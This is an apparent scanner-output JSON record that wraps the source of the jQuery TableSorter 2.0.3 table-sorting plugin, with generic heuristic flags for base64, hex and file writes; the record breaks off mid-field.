{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "write": "May write to a file"
        },
        "macro": "\ufeff/*\n * \n * TableSorter 2.0 - Client-side table sorting with ease!\n * Version 2.0.3\n * @requires jQuery v1.2.3\n * \n * Copyright (c) 2007 Christian Bach\n * Examples and docs at: http://tablesorter.com\n * Dual licensed under the MIT and GPL licenses:\n * http://www.opensource.org/licenses/mit-license.php\n * http://www.gnu.org/licenses/gpl.html\n * \n */\n/**\n *\n * @description Create a sortable table with multi-column sorting capabilitys\n * \n * @example $('table').tablesorter();\n * @desc Create a simple tablesorter interface.\n *\n * @example $('table').tablesorter({ sortList:[[0,0],[1,0]] });\n * @desc Create a tablesorter interface and sort on the first and secound column in ascending order.\n * \n * @example $('table').tablesorter({ headers: { 0: { sorter: false}, 1: {sorter: false} } });\n * @desc Create a tablesorter interface and disableing the first and secound column headers.\n * \n * @example $('table').tablesorter({ 0: {sorter:\"integer\"}, 1: {sorter:\"currency\"} });\n * @desc Create a tablesorter interface and set a column parser for the first and secound column.\n * \n * \n * @param Object settings An object literal containing key/value pairs to provide optional settings.\n * \n * @option String cssHeader (optional) \t\t\tA string of the class name to be appended to sortable tr elements in the thead of the table. \n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"header\"\n * \n * @option String cssAsc (optional) \t\t\tA string of the class name to be appended to sortable tr elements in the thead on a ascending sort. \n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"headerSortUp\"\n * \n * @option String cssDesc (optional) \t\t\tA string of the class name to be appended to sortable tr elements in the thead on a descending sort. \n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"headerSortDown\"\n * \n * @option String sortInitialOrder (optional) \tA string of the inital sorting order can be asc or desc. \n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"asc\"\n * \n * @option String sortMultisortKey (optional) \tA string of the multi-column sort key. \n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"shiftKey\"\n * \n * @option String textExtraction (optional) \tA string of the text-extraction method to use. \n * \t\t\t\t\t\t\t\t\t\t\t\tFor complex html structures inside td cell set this option to \"complex\", \n * \t\t\t\t\t\t\t\t\t\t\t\ton large tables the complex option can be slow. \n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"simple\"\n * \n * @option Object headers (optional) \t\t\tAn array containing the forces sorting rules. \n * \t\t\t\t\t\t\t\t\t\t\t\tThis option let's you specify a default sorting rule. \n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: null\n * \n * @option Array sortList (optional) \t\t\tAn array containing the forces sorting rules. \n * \t\t\t\t\t\t\t\t\t\t\t\tThis option let's you specify a default sorting rule. \n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: null\n * \n * @option Array sortForce (optional) \t\t\tAn array containing forced sorting rules. \n * \t\t\t\t\t\t\t\t\t\t\t\tThis option let's you specify a default sorting rule, which is prepended to user-selected rules.\n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: null\n *  \n  * @option Array sortAppend (optional) \t\t\tAn array containing forced sorting rules. \n * \t\t\t\t\t\t\t\t\t\t\t\tThis option let's you specify a default sorting rule, which is appended to user-selected rules.\n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: null\n * \n * @option Boolean widthFixed (optional) \t\tBoolean flag indicating if tablesorter should apply fixed widths to the table columns.\n * \t\t\t\t\t\t\t\t\t\t\t\tThis is usefull when using the pager companion plugin.\n * \t\t\t\t\t\t\t\t\t\t\t\tThis options requires the dimension jquery plugin.\n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: false\n *\n * @option Boolean cancelSelection (optional) \tBoolean flag indicating if tablesorter should cancel selection of the table headers text.\n * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: true\n *\n * @option Boolean debug (optional) \t\t\tBoolean flag indicating if tablesorter should display debuging information usefull for development.\n *\n * @type jQuery\n *\n * @name tablesorter\n * \n * @cat Plugins/Tablesorter\n * \n * @author Christian Bach/christian.bach@polyester.se\n */\n\n(function($) {\n\t$.extend({\n\t\ttablesorter: new function() {\n\t\t\t\n\t\t\tvar parsers = [], widgets = [];\n\t\t\t\n\t\t\tthis.defaults = {\n\t\t\t\tcssHeader: \"header\",\n\t\t\t\tcssAsc: \"headerSortUp\",\n\t\t\t\tcssDesc: \"headerSortDown\",\n\t\t\t\tsortInitialOrder: \"asc\",\n\t\t\t\tsortMultiSortKey: \"shiftKey\",\n\t\t\t\tsortForce: null,\n\t\t\t\tsortAppend: null,\n\t\t\t\ttextExtraction: \"simple\",\n\t\t\t\tparsers: {}, \n\t\t\t\twidgets: [],\t\t\n\t\t\t\twidgetZebra: {css: [\"even\",\"odd\"]},\n\t\t\t\theaders: {},\n\t\t\t\twidthFixed: false,\n\t\t\t\tcancelSelection: true,\n\t\t\t\tsortList: [],\n\t\t\t\theaderList: [],\n\t\t\t\tdateFormat: \"us\",\n\t\t\t\tdecimal: '.',\n\t\t\t\tdebug: false\n\t\t\t};\n\t\t\t\n\t\t\t/* debuging utils */\n\t\t\tfunction benchmark(s,d) {\n\t\t\t\tlog(s + \",\" + (new Date().getTime() - d.getTime()) + \"ms\");\n\t\t\t}\n\t\t\t\n\t\t\tthis.benchmark = benchmark;\n\t\t\t\n\t\t\tfunction log(s) {\n\t\t\t\tif (typeof console != \"undefined\" && typeof console.debug != \"undefined\") {\n\t\t\t\t\tconsole.log(s);\n\t\t\t\t} else {\n\t\t\t\t\talert(s);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\t\t\t\n\t\t\t/* parsers utils */\n\t\t\tfunction buildParserCache(table,$headers) {\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { var parsersDebug = \"\"; }\n\t\t\t\t\n\t\t\t\tvar rows = table.tBodies[0].rows;\n\t\t\t\t\n\t\t\t\tif(table.tBodies[0].rows[0]) {\n\n\t\t\t\t\tvar list = [], cells = rows[0].cells, l = cells.length;\n\t\t\t\t\t\n\t\t\t\t\tfor (var i=0;i < l; i++) {\n\t\t\t\t\t\tvar p = false;\n\t\t\t\t\t\t\n\t\t\t\t\t\tif($.metadata && ($($headers[i]).metadata() && $($headers[i]).metadata().sorter)  ) {\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tp = getParserById($($headers[i]).metadata().sorter);\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t} else if((table.config.headers[i] && table.config.headers[i].sorter)) {\n\t\n\t\t\t\t\t\t\tp = getParserById(table.config.headers[i].sorter);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif(!p) {\n\t\t\t\t\t\t\tp = detectParserForColumn(table,cells[i]);\n\t\t\t\t\t\t}\n\t\n\t\t\t\t\t\tif(table.config.debug) { parsersDebug += \"column:\" + i + \" parser:\" +p.id + \"\\n\"; }\n\t\n\t\t\t\t\t\tlist.push(p);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { log(parsersDebug); }\n\n\t\t\t\treturn list;\n\t\t\t};\n\t\t\t\n\t\t\tfunction detectParserForColumn(table,node) {\n\t\t\t\tvar l = parsers.length;\n\t\t\t\tfor(var i=1; i < l; i++) {\n\t\t\t\t\tif(parsers[i].is($.trim(getElementText(table.config,node)),table,node)) {\n\t\t\t\t\t\treturn parsers[i];\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t// 0 is always the generic parser (text)\n\t\t\t\treturn parsers[0];\n\t\t\t}\n\t\t\t\n\t\t\tfunction getParserById(name) {\n\t\t\t\tvar l = parsers.length;\n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\tif(parsers[i].id.toLowerCase() == name.toLowerCase()) {\t\n\t\t\t\t\t\treturn parsers[i];\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t\n\t\t\t/* utils */\n\t\t\tfunction buildCache(table) {\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { var cacheTime = new Date(); }\n\t\t\t\t\n\t\t\t\t\n\t\t\t\tvar totalRows = (table.tBodies[0] && table.tBodies[0].rows.length) || 0,\n\t\t\t\t\ttotalCells = (table.tBodies[0].rows[0] && table.tBodies[0].rows[0].cells.length) || 0,\n\t\t\t\t\tparsers = table.config.parsers, \n\t\t\t\t\tcache = {row: [], normalized: []};\n\t\t\t\t\n\t\t\t\t\tfor (var i=0;i < totalRows; ++i) {\n\t\t\t\t\t\n\t\t\t\t\t\t/** Add the table data to main data array */\n\t\t\t\t\t\tvar c = table.tBodies[0].rows[i], cols = [];\n\t\t\t\t\t\n\t\t\t\t\t\tcache.row.push($(c));\n\t\t\t\t\t\t\n\t\t\t\t\t\tfor(var j=0; j < totalCells; ++j) {\n\t\t\t\t\t\t\tcols.push(parsers[j].format(getElementText(table.config,c.cells[j]),table,c.cells[j]));\t\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\tcols.push(i); // add position for rowCache\n\t\t\t\t\t\tcache.normalized.push(cols);\n\t\t\t\t\t\tcols = null;\n\t\t\t\t\t};\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { benchmark(\"Building cache for \" + totalRows + \" rows:\", cacheTime); }\n\t\t\t\t\n\t\t\t\treturn cache;\n\t\t\t};\n\t\t\t\n\t\t\tfunction getElementText(config,node) {\n\t\t\t\t\n\t\t\t\tif(!node) return \"\";\n\t\t\t\t\t\t\t\t\n\t\t\t\tvar t = \"\";\n\t\t\t\t\n\t\t\t\tif(config.textExtraction == \"simple\") {\n\t\t\t\t\tif(node.childNodes[0] && node.childNodes[0].hasChildNodes()) {\n\t\t\t\t\t\tt = node.childNodes[0].innerHTML;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tt = node.innerHTML;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tif(typeof(config.textExtraction) == \"function\") {\n\t\t\t\t\t\tt = config.textExtraction(node);\n\t\t\t\t\t} else { \n\t\t\t\t\t\tt = $(node).text();\n\t\t\t\t\t}\t\n\t\t\t\t}\n\t\t\t\treturn t;\n\t\t\t}\n\t\t\t\n\t\t\tfunction appendToTable(table,cache) {\n\t\t\t\t\n\t\t\t\tif(table.config.debug) {var appendTime = new Date()}\n\t\t\t\t\n\t\t\t\tvar c = cache, \n\t\t\t\t\tr = c.row, \n\t\t\t\t\tn= c.normalized, \n\t\t\t\t\ttotalRows = n.length, \n\t\t\t\t\tcheckCell = (n[0].length-1), \n\t\t\t\t\ttableBody = $(table.tBodies[0]),\n\t\t\t\t\trows = [];\n\t\t\t\t\n\t\t\t\tfor (var i=0;i < totalRows; i++) {\n\t\t\t\t\trows.push(r[n[i][checkCell]]);\t\n\t\t\t\t\tif(!table.config.appender) {\n\t\t\t\t\t\t\n\t\t\t\t\t\tvar o = r[n[i][checkCell]];\n\t\t\t\t\t\tvar l = o.length;\n\t\t\t\t\t\tfor(var j=0; j < l; j++) {\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\ttableBody[0].appendChild(o[j]);\n\t\t\t\t\t\t\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\t//tableBody.append(r[n[i][checkCell]]);\n\t\t\t\t\t}\n\t\t\t\t}\t\n\t\t\t\t\n\t\t\t\tif(table.config.appender) {\n\t\t\t\t\n\t\t\t\t\ttable.config.appender(table,rows);\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\trows = null;\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { benchmark(\"Rebuilt table:\", appendTime); }\n\t\t\t\t\t\t\t\t\n\t\t\t\t//apply table widgets\n\t\t\t\tapplyWidget(table);\n\t\t\t\t\n\t\t\t\t// trigger sortend\n\t\t\t\tsetTimeout(function() {\n\t\t\t\t\t$(table).trigger(\"sortEnd\");\t\n\t\t\t\t},0);\n\t\t\t\t\n\t\t\t};\n\t\t\t\n\t\t\tfunction buildHeaders(table) {\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { var time = new Date(); }\n\t\t\t\t\n\t\t\t\tvar meta = ($.metadata) ? true : false, tableHeadersRows = [];\n\t\t\t\n\t\t\t\tfor(var i = 0; i < table.tHead.rows.length; i++) { tableHeadersRows[i]=0; };\n\t\t\t\t\n\t\t\t\t$tableHeaders = $(\"thead th\",table);\n\t\t\n\t\t\t\t$tableHeaders.each(function(index) {\n\t\t\t\t\t\t\t\n\t\t\t\t\tthis.count = 0;\n\t\t\t\t\tthis.column = index;\n\t\t\t\t\tthis.order = formatSortingOrder(table.config.sortInitialOrder);\n\t\t\t\t\t\n\t\t\t\t\tif(checkHeaderMetadata(this) || checkHeaderOptions(table,index)) this.sortDisabled = true;\n\t\t\t\t\t\n\t\t\t\t\tif(!this.sortDisabled) {\n\t\t\t\t\t\t$(this).addClass(table.config.cssHeader);\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t// add cell to headerList\n\t\t\t\t\ttable.config.headerList[index]= this;\n\t\t\t\t});\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { benchmark(\"Built headers:\", time); log($tableHeaders); }\n\t\t\t\t\n\t\t\t\treturn $tableHeaders;\n\t\t\t\t\n\t\t\t};\n\t\t\t\t\t\t\n\t\t   \tfunction checkCellColSpan(table, rows, row) {\n                var arr = [], r = table.tHead.rows, c = r[row].cells;\n\t\t\t\t\n\t\t\t\tfor(var i=0; i < c.length; i++) {\n\t\t\t\t\tvar cell = c[i];\n\t\t\t\t\t\n\t\t\t\t\tif ( cell.colSpan > 1) { \n\t\t\t\t\t\tarr = arr.concat(checkCellColSpan(table, headerArr,row++));\n\t\t\t\t\t} else  {\n\t\t\t\t\t\tif(table.tHead.length == 1 || (cell.rowSpan > 1 || !r[row+1])) {\n\t\t\t\t\t\t\tarr.push(cell);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t//headerArr[row] = (i+row);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn arr;\n\t\t\t};\n\t\t\t\n\t\t\tfunction checkHeaderMetadata(cell) {\n\t\t\t\tif(($.metadata) && ($(cell).metadata().sorter === false)) { return true; };\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t\n\t\t\tfunction checkHeaderOptions(table,i) {\t\n\t\t\t\tif((table.config.headers[i]) && (table.config.headers[i].sorter === false)) { return true; };\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t\n\t\t\tfunction applyWidget(table) {\n\t\t\t\tvar c = table.config.widgets;\n\t\t\t\tvar l = c.length;\n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\t\n\t\t\t\t\tgetWidgetById(c[i]).format(table);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t}\n\t\t\t\n\t\t\tfunction getWidgetById(name) {\n\t\t\t\tvar l = widgets.length;\n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\tif(widgets[i].id.toLowerCase() == name.toLowerCase() ) {\n\t\t\t\t\t\treturn widgets[i]; \n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t};\n\t\t\t\n\t\t\tfunction formatSortingOrder(v) {\n\t\t\t\t\n\t\t\t\tif(typeof(v) != \"Number\") {\n\t\t\t\t\ti = (v.toLowerCase() == \"desc\") ? 1 : 0;\n\t\t\t\t} else {\n\t\t\t\t\ti = (v == (0 || 1)) ? v : 0;\n\t\t\t\t}\n\t\t\t\treturn i;\n\t\t\t}\n\t\t\t\n\t\t\tfunction isValueInArray(v, a) {\n\t\t\t\tvar l = a.length;\n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\tif(a[i][0] == v) {\n\t\t\t\t\t\treturn true;\t\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t\t\n\t\t\tfunction setHeadersCss(table,$headers, list, css) {\n\t\t\t\t// remove all header information\n\t\t\t\t$headers.removeClass(css[0]).removeClass(css[1]);\n\t\t\t\t\n\t\t\t\tvar h = [];\n\t\t\t\t$headers.each(function(offset) {\n\t\t\t\t\t\tif(!this.sortDisabled) {\n\t\t\t\t\t\t\th[this.column] = $(this);\t\t\t\t\t\n\t\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t\t\n\t\t\t\tvar l = list.length; \n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\th[list[i][0]].addClass(css[list[i][1]]);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tfunction fixColumnWidth(table,$headers) {\n\t\t\t\tvar c = table.config;\n\t\t\t\tif(c.widthFixed) {\n\t\t\t\t\tvar colgroup = $('<colgroup>');\n\t\t\t\t\t$(\"tr:first td\",table.tBodies[0]).each(function() {\n\t\t\t\t\t\tcolgroup.append($('<col>').css('width',$(this).width()));\n\t\t\t\t\t});\n\t\t\t\t\t$(table).prepend(colgroup);\n\t\t\t\t};\n\t\t\t}\n\t\t\t\n\t\t\tfunction updateHeaderSortCount(table,sortList) {\n\t\t\t\tvar c = table.config, l = sortList.length;\n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\tvar s = sortList[i], o = c.headerList[s[0]];\n\t\t\t\t\to.count = s[1];\n\t\t\t\t\to.count++;\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t/* sorting methods */\n\t\t\tfunction multisort(table,sortList,cache) {\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { var sortTime = new Date(); }\n\t\t\t\t\n\t\t\t\tvar dynamicExp = \"var sortWrapper = function(a,b) {\", l = sortList.length;\n\t\t\t\t\t\n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\t\n\t\t\t\t\tvar c = sortList[i][0];\n\t\t\t\t\tvar order = sortList[i][1];\n\t\t\t\t\tvar s = (getCachedSortType(table.config.parsers,c) == \"text\") ? ((order == 0) ? \"sortText\" : \"sortTextDesc\") : ((order == 0) ? \"sortNumeric\" : \"sortNumericDesc\");\n\t\t\t\t\t\n\t\t\t\t\tvar e = \"e\" + i;\n\t\t\t\t\t\n\t\t\t\t\tdynamicExp += \"var \" + e + \" = \" + s + \"(a[\" + c + \"],b[\" + c + \"]); \";\n\t\t\t\t\tdynamicExp += \"if(\" + e + \") { return \" + e + \"; } \";\n\t\t\t\t\tdynamicExp += \"else { \";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// if value is the same keep orignal order\t\n\t\t\t\tvar orgOrderCol = cache.normalized[0].length - 1;\n\t\t\t\tdynamicExp += \"return a[\" + orgOrderCol + \"]-b[\" + orgOrderCol + \"];\";\n\t\t\t\t\t\t\n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\tdynamicExp += \"}; \";\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tdynamicExp += \"return 0; \";\t\n\t\t\t\tdynamicExp += \"}; \";\t\n\t\t\t\t\n\t\t\t\teval(dynamicExp);\n\t\t\t\t\n\t\t\t\tcache.normalized.sort(sortWrapper);\n\t\t\t\t\n\t\t\t\tif(table.config.debug) { benchmark(\"Sorting on \" + sortList.toString() + \" and dir \" + order+ \" time:\", sortTime); }\n\t\t\t\t\n\t\t\t\treturn cache;\n\t\t\t};\n\t\t\t\n\t\t\tfunction sortText(a,b) {\n\t\t\t\treturn ((a < b) ? -1 : ((a > b) ? 1 : 0));\n\t\t\t};\n\t\t\t\n\t\t\tfunction sortTextDesc(a,b) {\n\t\t\t\treturn ((b < a) ? -1 : ((b > a) ? 1 : 0));\n\t\t\t};\t\n\t\t\t\n\t \t\tfunction sortNumeric(a,b) {\n\t\t\t\treturn a-b;\n\t\t\t};\n\t\t\t\n\t\t\tfunction sortNumericDesc(a,b) {\n\t\t\t\treturn b-a;\n\t\t\t};\n\t\t\t\n\t\t\tfunction getCachedSortType(parsers,i) {\n\t\t\t\treturn parsers[i].type;\n\t\t\t};\n\t\t\t\n\t\t\t/* public methods */\n\t\t\tthis.construct = function(settings) {\n\n\t\t\t\treturn this.each(function() {\n\t\t\t\t\t\n\t\t\t\t\tif(!this.tHead || !this.tBodies) return;\n\t\t\t\t\t\n\t\t\t\t\tvar $this, $document,$headers, cache, config, shiftDown = 0, sortOrder;\n\t\t\t\t\t\n\t\t\t\t\tthis.config = {};\n\t\t\t\t\t\n\t\t\t\t\tconfig = $.extend(this.config, $.tablesorter.defaults, settings);\n\t\t\t\t\t\n\t\t\t\t\t// store common expression for speed\t\t\t\t\t\n\t\t\t\t\t$this = $(this);\n\t\t\t\t\t\n\t\t\t\t\t// build headers\n\t\t\t\t\t$headers = buildHeaders(this);\n\t\t\t\t\t\n\t\t\t\t\t// try to auto detect column type, and store in tables config\n\t\t\t\t\tthis.config.parsers = buildParserCache(this,$headers);\n\t\t\t\t\t\n\t\t\t\t\t\n\t\t\t\t\t// build the cache for the tbody cells\n\t\t\t\t\tcache = buildCache(this);\n\t\t\t\t\t\n\t\t\t\t\t// get the css class names, could be done else where.\n\t\t\t\t\tvar sortCSS = [config.cssDesc,config.cssAsc];\n\t\t\t\t\t\n\t\t\t\t\t// fixate columns if the users supplies the fixedWidth option\n\t\t\t\t\tfixColumnWidth(this);\n\t\t\t\t\t\n\t\t\t\t\t// apply event handling to headers\n\t\t\t\t\t// this is to big, perhaps break it out?\n\t\t\t\t\t$headers.click(function(e) {\n\t\t\t\t\t\t\n\t\t\t\t\t\t$this.trigger(\"sortStart\");\n\t\t\t\t\t\t\n\t\t\t\t\t\tvar totalRows = ($this[0].tBodies[0] && $this[0].tBodies[0].rows.length) || 0;\n\t\t\t\t\t\t\n\t\t\t\t\t\tif(!this.sortDisabled && totalRows > 0) {\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t// store exp, for speed\n\t\t\t\t\t\t\tvar $cell = $(this);\n\t\n\t\t\t\t\t\t\t// get current column index\n\t\t\t\t\t\t\tvar i = this.column;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t// get current column sort order\n\t\t\t\t\t\t\tthis.order = this.count++ % 2;\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t// user only whants to sort on one column\n\t\t\t\t\t\t\tif(!e[config.sortMultiSortKey]) {\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// flush the sort list\n\t\t\t\t\t\t\t\tconfig.sortList = [];\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif(config.sortForce != null) {\n\t\t\t\t\t\t\t\t\tvar a = config.sortForce; \n\t\t\t\t\t\t\t\t\tfor(var j=0; j < a.length; j++) {\n\t\t\t\t\t\t\t\t\t\tif(a[j][0] != i) {\n\t\t\t\t\t\t\t\t\t\t\tconfig.sortList.push(a[j]);\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// add column to sort list\n\t\t\t\t\t\t\t\tconfig.sortList.push([i,this.order]);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t// multi column sorting\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t// the user has clicked on an all ready sortet column.\n\t\t\t\t\t\t\t\tif(isValueInArray(i,config.sortList)) {\t \n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t// revers the sorting direction for all tables.\n\t\t\t\t\t\t\t\t\tfor(var j=0; j < config.sortList.length; j++) {\n\t\t\t\t\t\t\t\t\t\tvar s = config.sortList[j], o = config.headerList[s[0]];\n\t\t\t\t\t\t\t\t\t\tif(s[0] == i) {\n\t\t\t\t\t\t\t\t\t\t\to.count = s[1];\n\t\t\t\t\t\t\t\t\t\t\to.count++;\n\t\t\t\t\t\t\t\t\t\t\ts[1] = o.count % 2;\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\t\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t// add column to sort list array\n\t\t\t\t\t\t\t\t\tconfig.sortList.push([i,this.order]);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t};\n\t\t\t\t\t\t\tsetTimeout(function() {\n\t\t\t\t\t\t\t\t//set css for headers\n\t\t\t\t\t\t\t\tsetHeadersCss($this[0],$headers,config.sortList,sortCSS);\n\t\t\t\t\t\t\t\tappendToTable($this[0],multisort($this[0],config.sortList,cache));\n\t\t\t\t\t\t\t},1);\n\t\t\t\t\t\t\t// stop normal event by returning false\n\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t\t}\n\t\t\t\t\t// cancel selection\t\n\t\t\t\t\t}).mousedown(function() {\n\t\t\t\t\t\tif(config.cancelSelection) {\n\t\t\t\t\t\t\tthis.onselectstart = function() {return false};\n\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t\t}\n\t\t\t\t\t});\n\t\t\t\t\t\n\t\t\t\t\t// apply easy methods that trigger binded events\n\t\t\t\t\t$this.bind(\"update\",function() {\n\t\t\t\t\t\t\n\t\t\t\t\t\t// rebuild parsers.\n\t\t\t\t\t\tthis.config.parsers = buildParserCache(this,$headers);\n\t\t\t\t\t\t\n\t\t\t\t\t\t// rebuild the cache map\n\t\t\t\t\t\tcache = buildCache(this);\n\t\t\t\t\t\t\n\t\t\t\t\t}).bind(\"sorton\",function(e,list) {\n\t\t\t\t\t\t\n\t\t\t\t\t\t$(this).trigger(\"sortStart\");\n\t\t\t\t\t\t\n\t\t\t\t\t\tconfig.sortList = list;\n\t\t\t\t\t\t\n\t\t\t\t\t\t// update and store the sortlist\n\t\t\t\t\t\tvar sortList = config.sortList;\n\t\t\t\t\t\t\n\t\t\t\t\t\t// update header count index\n\t\t\t\t\t\tupdateHeaderSortCount(this,sortList);\n\t\t\t\t\t\t\n\t\t\t\t\t\t//set css for headers\n\t\t\t\t\t\tsetHeadersCss(this,$headers,sortList,sortCSS);\n\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\t// sort the table and append it to the dom\n\t\t\t\t\t\tappendToTable(this,multisort(this,sortList,cache));\n\n\t\t\t\t\t}).bind(\"appendCache\",function() {\n\t\t\t\t\t\t\n\t\t\t\t\t\tappendToTable(this,cache);\n\t\t\t\t\t\n\t\t\t\t\t}).bind(\"applyWidgetId\",function(e,id) {\n\t\t\t\t\t\t\n\t\t\t\t\t\tgetWidgetById(id).format(this);\n\t\t\t\t\t\t\n\t\t\t\t\t}).bind(\"applyWidgets\",function() {\n\t\t\t\t\t\t// apply widgets\n\t\t\t\t\t\tapplyWidget(this);\n\t\t\t\t\t});\n\t\t\t\t\t\n\t\t\t\t\tif($.metadata && ($(this).metadata() && $(this).metadata().sortlist)) {\n\t\t\t\t\t\tconfig.sortList = $(this).metadata().sortlist;\n\t\t\t\t\t}\n\t\t\t\t\t// if user has supplied a sort list to constructor.\n\t\t\t\t\tif(config.sortList.length > 0) {\n\t\t\t\t\t\t$this.trigger(\"sorton\",[config.sortList]);\t\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\t// apply widgets\n\t\t\t\t\tapplyWidget(this);\n\t\t\t\t});\n\t\t\t};\n\t\t\t\n\t\t\tthis.addParser = function(parser) {\n\t\t\t\tvar l = parsers.length, a = true;\n\t\t\t\tfor(var i=0; i < l; i++) {\n\t\t\t\t\tif(parsers[i].id.toLowerCase() == parser.id.toLowerCase()) {\n\t\t\t\t\t\ta = false;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif(a) { parsers.push(parser); };\n\t\t\t};\n\t\t\t\n\t\t\tthis.addWidget = function(widget) {\n\t\t\t\twidgets.push(widget);\n\t\t\t};\n\t\t\t\n\t\t\tthis.formatFloat = function(s) {\n\t\t\t\tvar i = parseFloat(s);\n\t\t\t\treturn (isNaN(i)) ? 0 : i;\n\t\t\t};\n\t\t\tthis.formatInt = function(s) {\n\t\t\t\tvar i = parseInt(s);\n\t\t\t\treturn (isNaN(i)) ? 0 : i;\n\t\t\t};\n\t\t\t\n\t\t\tthis.isDigit = function(s,config) {\n\t\t\t\tvar DECIMAL = '\\\\' + config.decimal;\n\t\t\t\tvar exp = '/(^[+]?0(' + DECIMAL +'0+)?$)|(^([-+]?[1-9][0-9]*)$)|(^([-+]?((0?|[1-9][0-9]*)' + DECIMAL +'(0*[1-9][0-9]*)))$)|(^[-+]?[1-9]+[0-9]*' + DECIMAL +'0+$)/';\n\t\t\t\treturn RegExp(exp).test($.trim(s));\n\t\t\t};\n\t\t\t\n\t\t\tthis.clearTableBody = function(table) {\n\t\t\t\tif($.browser.msie) {\n\t\t\t\t\tfunction empty() {\n\t\t\t\t\t\twhile ( this.firstChild ) this.removeChild( this.firstChild );\n\t\t\t\t\t}\n\t\t\t\t\tempty.apply(table.tBodies[0]);\n\t\t\t\t} else {\n\t\t\t\t\ttable.tBodies[0].innerHTML = \"\";\n\t\t\t\t}\n\t\t\t};\n\t\t}\n\t});\n\t\n\t// extend plugin scope\n\t$.fn.extend({\n        tablesorter: $.tablesorter.construct\n\t});\n\t\n\tvar ts = $.tablesorter;\n\t\n\t// add default parsers\n\tts.addParser({\n\t\tid: \"text\",\n\t\tis: function(s) {\n\t\t\treturn true;\n\t\t},\n\t\tformat: function(s) {\n\t\t\treturn $.trim(s.toLowerCase());\n\t\t},\n\t\ttype: \"text\"\n\t});\n\t\n\tts.addParser({\n\t\tid: \"digit\",\n\t\tis: function(s,table) {\n\t\t\tvar c = table.config;\n\t\t\treturn $.tablesorter.isDigit(s,c);\n\t\t},\n\t\tformat: function(s) {\n\t\t\treturn $.tablesorter.formatFloat(s);\n\t\t},\n\t\ttype: 